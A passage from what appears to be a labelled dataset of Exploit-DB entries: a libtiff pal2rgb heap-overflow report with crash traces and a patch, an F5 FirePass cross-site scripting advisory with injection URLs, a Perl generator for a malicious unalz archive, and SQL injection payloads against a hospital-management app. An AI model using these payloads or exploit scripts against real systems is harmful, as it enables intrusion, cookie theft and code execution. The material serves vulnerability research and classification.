(/lib/x86_64-linux-gnu/libc.so.6+0x21f44)  SUMMARY: AddressSanitizer: heap-buffer-overflow (/home/vagrant/targets/asan/tt/tools/pal2rgb+0x4f3108) Shadow bytes around the buggy address:   0x0c227fff93a0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa   0x0c227fff93b0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa   0x0c227fff93c0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa   0x0c227fff93d0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa   0x0c227fff93e0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 =>0x0c227fff93f0: 00 00 00 00 00 00 00 00 00 00 00 00[01]fa fa fa   0x0c227fff9400: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa   0x0c227fff9410: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa   0x0c227fff9420: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa   0x0c227fff9430: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa   0x0c227fff9440: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa Shadow byte legend (one shadow byte represents 8 application bytes):   Addressable:           00   Partially addressable: 01 02 03 04 05 06 07   Heap left redzone:       fa   Heap right redzone:      fb   Freed heap region:       fd   Stack left redzone:      f1   Stack mid redzone:       f2   Stack right redzone:     f3   Stack partial redzone:   f4   Stack after return:      f5   Stack use after scope:   f8   Global redzone:          f9   Global init order:       f6   Poisoned by user:        f7   Container overflow:      fc   Array cookie:            ac   Intra object redzone:    bb   ASan internal:           fe   Left alloca redzone:     ca   Right alloca redzone:    cb ==29649==ABORTING  pal2rgb allocates the output buffer(obuf) too small at tools/pal2rgb.c:188. That cause heap overflow and lead to memory corruption in TIFFSetupStrips().  (gdb) r sample.tiff /dev/null The program being debugged has been started already. Start it from the beginning? (y or n) y  Starting program: /home/vagrant/targets/asan/tt/tools/pal2rgb sample.tiff /dev/null TIFFFetchNormalTag: Warning, IO error during reading of ""XResolution""; tag ignored. TIFFFetchNormalTag: Warning, IO error during reading of ""YResolution""; tag ignored. sample.tiff: JPEG compression support is not configured. TIFFSetField: /dev/null: Unknown pseudo-tag 65537. TIFFSetField: /dev/null: Unknown pseudo-tag 65538. sample.tiff: JPEG compression support is not configured. *** Error in `/home/vagrant/targets/asan/tt/tools/pal2rgb': malloc(): memory corruption: 0x0000000000652160 ***  Program received signal SIGABRT, Aborted. 0x00007ffff7741c37 in __GI_raise (sig=sig@entry=6) at ../nptl/sysdeps/unix/sysv/linux/raise.c:56 56    ../nptl/sysdeps/unix/sysv/linux/raise.c: No such file or directory. (gdb) bt #0  0x00007ffff7741c37 in __GI_raise (sig=sig@entry=6) at ../nptl/sysdeps/unix/sysv/linux/raise.c:56 #1  0x00007ffff7745028 in __GI_abort () at abort.c:89 #2  0x00007ffff777e2a4 in __libc_message (do_abort=1,     fmt=fmt@entry=0x7ffff7890310 ""*** Error in `%s': %s: 0x%s ***\n"")     at ../sysdeps/posix/libc_fatal.c:175 #3  0x00007ffff778c584 in malloc_printerr (ptr=0x652160,     str=0x7ffff788c4df ""malloc(): memory corruption"", action=<optimized out>) at malloc.c:4998 #4  _int_malloc (av=0x7ffff7acd760 <main_arena>, bytes=24) at malloc.c:3449 #5  0x00007ffff778dae0 in __GI___libc_malloc (bytes=24) at malloc.c:2893 #6  0x00000000004122a5 in TIFFSetupStrips (tif=tif@entry=0x651b80) at tif_write.c:545 #7  0x00000000004124b5 in TIFFWriteCheck (tif=0x651b80, tiles=<optimized out>,     module=0x42de50 <module> ""TIFFWriteScanline"") at tif_write.c:613 #8  0x0000000000412a74 in TIFFWriteScanline (tif=tif@entry=0x651b80, buf=buf@entry=0x652070,     row=row@entry=0, sample=sample@entry=0) at tif_write.c:56 #9  0x0000000000401dbd in main (argc=<optimized out>, argv=<optimized out>) at pal2rgb.c:200  Affected version: 4.0.9 Latest version: 4.0.9 ------- Comment #1 From jungun.baek 2017-11-29 01:44:26 ------- pal2rgb allocate output buffer to convert TIFF format. The output buffer always uses a fixed size(225).  However, when write data to output buffer, imagewidth and imagelength of the input TIFF file are used. it lead to heap overflow.  1) get imagewidth and imagelength from input TIFF  tools/pal2rgb.c:142     TIFFGetField(in, TIFFTAG_IMAGEWIDTH, &imagewidth); tools/pal2rgb.c:143     TIFFGetField(in, TIFFTAG_IMAGELENGTH, &imagelength);  2) allocate output buffer tools/pal2rgb.c:188       obuf = (unsigned char*)_TIFFmalloc(TIFFScanlineSize(out)); // TIFFScanlineSize(out) returns always 225.  3) write data to output buffer tools/pal2rgb.c:191         for (row = 0; row < imagelength; row++) { tools/pal2rgb.c:192             if (!TIFFReadScanline(in, ibuf, row, 0)) tools/pal2rgb.c:193                 goto done; tools/pal2rgb.c:194             pp = obuf; tools/pal2rgb.c:195             for (x = 0; x < imagewidth; x++) { // HEAP OVERFLOW! tools/pal2rgb.c:196                 *pp++ = (unsigned char) rmap[ibuf[x]]; tools/pal2rgb.c:197                 *pp++ = (unsigned char) gmap[ibuf[x]]; tools/pal2rgb.c:198                 *pp++ = (unsigned char) bmap[ibuf[x]]; tools/pal2rgb.c:199             } tools/pal2rgb.c:200             if (!TIFFWriteScanline(out, obuf, row, 0)) // CRASH! tools/pal2rgb.c:201                 goto done; tools/pal2rgb.c:202         } ------- Comment #2 From jungun.baek 2017-11-29 02:28:44 ------- Created an attachment (id=819) [details] heap overflow PoC ------- Comment #3 From jungun.baek 2017-11-29 06:33:21 ------- The process's heap memory was corrupted by COLORMAP/mage Width/Image Length of the TIFF document. The offset of the corresponding values in the poc.tiff file is shown below.  COLORMAP {     R : 0x25~0x224     G : 0x225~0x424     B : 0x425~0x624 }  Image Width : 0x24FE Image Length : 0x250A ------- Comment #4 From ncopa@alpinelinux.org 2017-12-07 04:42:35 ------- The following change fixes the describe behavior:  diff --git a/tools/pal2rgb.c b/tools/pal2rgb.c index 7a57800..92d9e29 100644 --- a/tools/pal2rgb.c +++ b/tools/pal2rgb.c @@ -184,15 +184,17 @@ main(int argc, char* argv[])      { unsigned char *ibuf, *obuf;        register unsigned char* pp;        register uint32 x; -      ibuf = (unsigned char*)_TIFFmalloc(TIFFScanlineSize(in)); -      obuf = (unsigned char*)_TIFFmalloc(TIFFScanlineSize(out)); +      size_t ibuf_size = TIFFScanlineSize(in); +      size_t obuf_size = TIFFScanlineSize(out); +      ibuf = (unsigned char*)_TIFFmalloc(ibuf_size); +      obuf = (unsigned char*)_TIFFmalloc(obuf_size);        switch (config) {        case PLANARCONFIG_CONTIG:          for (row = 0; row < imagelength; row++) {              if (!TIFFReadScanline(in, ibuf, row, 0))                  goto done;              pp = obuf; -            for (x = 0; x < imagewidth; x++) { +            for (x = 0; x < imagewidth && x < (obuf_size-3); x++) {                  *pp++ = (unsigned char) rmap[ibuf[x]];                  *pp++ = (unsigned char) gmap[ibuf[x]];                  *pp++ = (unsigned char) bmap[ibuf[x]]; @@ -205,15 +207,15 @@ main(int argc, char* argv[])          for (row = 0; row < imagelength; row++) {              if (!TIFFReadScanline(in, ibuf, row, 0))                  goto done; -            for (pp = obuf, x = 0; x < imagewidth; x++) +            for (pp = obuf, x = 0; x < imagewidth && x < obuf_size; x++)                  *pp++ = (unsigned char) rmap[ibuf[x]];              if (!TIFFWriteScanline(out, obuf, row, 0))                  goto done; -            for (pp = obuf, x = 0; x < imagewidth; x++) +            for (pp = obuf, x = 0; x < imagewidth && x < obuf_size; x++)                  *pp++ = (unsigned char) gmap[ibuf[x]];              if (!TIFFWriteScanline(out, obuf, row, 0))                  goto done; -            for (pp = obuf, x = 0; x < imagewidth; x++) +            for (pp = obuf, x = 0; x < imagewidth && x < obuf_size; x++)                  *pp++ = (unsigned char) bmap[ibuf[x]];              if (!TIFFWriteScanline(out, obuf, row, 0))                  goto done;   But the pal2rgb stil segfaults. new backtrace:  Core was generated by `pal2rgb /home/ncopa/Downloads/poc.tiff out.tiff'. Program terminated with signal SIGSEGV, Segmentation fault. #0  0x000065eb6f74f534 in jpeg_abort () from /usr/lib/libjpeg.so.8 (gdb) bt #0  0x000065eb6f74f534 in jpeg_abort () from /usr/lib/libjpeg.so.8 #1  0x000065eb6f9c26b7 in TIFFjpeg_abort (sp=sp@entry=0xdbd8738e7c0)     at tif_jpeg.c:416 #2  0x000065eb6f9c3f8c in JPEGPreDecode (tif=0x65eb6fc06900, s=<optimized out>)     at tif_jpeg.c:1114 #3  0x000065eb6f9d4305 in TIFFSeek (sample=0, row=54, tif=0x65eb6fc06900)     at tif_read.c:379 #4  TIFFReadScanline (tif=0x65eb6fc06900, buf=0xdbd8738ef40, row=54,      sample=<optimized out>) at tif_read.c:446 #5  0x00000dbd8718c5fc in main (argc=<optimized out>, argv=<optimized out>)     at pal2rgb.c:194   Proof of Concept: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/43322.zip",Heap Buffer Overflow,1
31698,"F5 Networks FirePass 4100 SSL VPN - 'installControl.php3' Cross-Site Scripting source: https://www.securityfocus.com/bid/28902/info  F5 Networks FirePass 4100 SSL VPN devices are prone to a cross-site scripting vulnerability because they fail to properly sanitize user-supplied input.  An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may help the attacker to steal cookie-based authentication credentials and to launch other attacks.  FirePass 4100 SSL VPN Firmware 5.4.2-5.5.2 and 6.0-6.2 are vulnerable.   http://www.example.com/installControl.php3?1&%22%3E%3C/script%3E%3Ctextarea%3EHtml%20injection%3C/textarea%3E%3C!--= http://www.example.com/installControl.php3?>'""><script>alert(514)</script>",Cross-Site Scripting,1
26601,"Unalz 0.x - Archive Filename Buffer Overflow source: https://www.securityfocus.com/bid/15577/info  The 'unalz' utility is prone to a buffer-overflow vulnerability. This issue is exposed when the application extracts an ALZ archive that contains a file with a long name.  An attacker could exploit this vulnerability to execute arbitrary code in the context of the user who extracts a malicious archive.   #!/usr/bin/perl --  # alzgen # by Ulf Harnhammar in 2005 # I hereby place this program in the public domain.  die ""usage: $0 <length> <filename>\n"" unless @ARGV == 2; $len = shift; $lenhi = int($len / 256); $lenlo = $len - ($lenhi * 256); $file = shift;  open(OUT, "">$file"") or die ""can't open file!\n""; print OUT ""\x42\x4c\x5a\x01"" .        # SIG_LOCAL_FILE_HEADER           chr($lenlo) . chr($lenhi) . # filename length           ""\x00"" x 7 .           'U' x $len; close OUT or die ""can't close file!?!?\n"";",Archive Filename Buffer Overflow,1
47398,"Hospital-Management 1.26 - 'fname' SQL Injection # Exploit Title: Hospital-Management 1.26 - 'fname' SQL Injection # Author: Cakes # Discovery Date: 2019-09-18 # Vendor Homepage: https://github.com/Mugerwa-Joseph/hospital-management # Software Link: https://github.com/Mugerwa-Joseph/hospital-management/archive/master.zip # Tested Version: 1.26 # Tested on OS: CentOS 7 # CVE: N/A  # Discription: # Simple SQL injection after application authentication.   # Type: boolean-based blind # Title: AND boolean-based blind - WHERE or HAVING clause # Payload:   fname=tester'||(SELECT 0x72516679 FROM DUAL WHERE 9119=9119 AND 1379=1379)||'&sname=tester&email=test@tester.com&phone=1123456783&address=123 happy lane&gender=Male&bloodgroup=B&birthyear=2002&btn=Add  # Type: error-based # Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR) # Payload:   fname=tester'||(SELECT 0x53495778 FROM DUAL WHERE 5761=5761 AND (SELECT 9648 FROM(SELECT COUNT(*),CONCAT(0x71787a7a71,(SELECT (ELT(9648=9648,1))),0x716b786b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a))||'&sname=tester&email=test@tester.com&phone=1123456783&address=123 happy lane&gender=Male&bloodgroup=B&birthyear=2002&btn=Add  # Type: time-based blind # Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP) # Payload:   fname=tester'||(SELECT 0x5144494b FROM DUAL WHERE 1043=1043 AND (SELECT 1880 FROM (SELECT(SLEEP(5)))AmmF))||'&sname=tester&email=test@tester.com&phone=1123456783&address=123 happy lane&gender=Male&bloodgroup=B&birthyear=2002&btn=Add",SQL Injection,1
